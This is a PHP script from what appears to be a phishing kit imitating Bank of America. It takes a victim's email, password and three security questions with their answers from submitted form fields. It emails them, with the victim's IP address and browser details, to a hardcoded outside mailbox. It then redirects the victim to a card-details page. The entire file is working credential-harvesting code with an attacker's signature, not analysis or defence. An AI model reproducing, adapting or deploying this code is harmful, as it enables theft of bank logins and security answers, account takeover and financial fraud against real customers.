<?php
error_reporting(0);
session_start();


$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;


$_SESSION['email'] = $_GET['1'];
$_SESSION['pass'] = $_GET['2'];

$_SESSION['Qes1'] = $_GET['Combobox1'];
$_SESSION['answer1'] = $_GET['3'];
$_SESSION['Qes2'] = $_GET['Combobox2'];
$_SESSION['answer2'] = $_GET['4'];
$_SESSION['Qes3'] = $_GET['Combobox3'];
$_SESSION['answer3'] = $_GET['5'];




$message = "
<div style=\"background-image: url('https://newevolutiondesigns.com/images/freebies/black-white-iphone-background-3.jpg');font-family: Tahoma;line-height: 25px;color: #333;font-size: 22px;border: 1px solid #06F;	padding: 20px;	border-radius: 5px; margin-top: 20px;\">
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
EMAIL:  =>   <font color='#F31414'>".$_GET['1']."</font><br />
Password :  =>   <font color='#F31414'>".$_GET['2']."</font><br />
Security Question 1    =>   <font color='#F31414'>".$_GET['Combobox1']."</font><br />
Answer 1:  =>   <font color='#F31414'>".$_GET['3']."</font><br />
Security Question 2  :  =>   <font color='#F31414'>".$_GET['Combobox2']."</font><br />
Answer 2 :  =>   <font color='#F31414'>".$_GET['4']."</font><br />
Security Question 3    =>   <font color='#F31414'>".$_GET['Combobox3']."</font><br />
Answer 3:  =>   <font color='#F31414'>".$_GET['5']."</font><br />
___________________________________________________________________
<br />
||~~ BY ~~ MR.Int(TN) ~~||
<br />

</div>";

$subject  = " BOA :  QES / BILLING-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: MR-OPA" . "\r\n";
$to = "jerryman@post.com";
@mail($to,$subject,$message,$headers);

 
 header("location:../card.php");
        
		  
		  ?>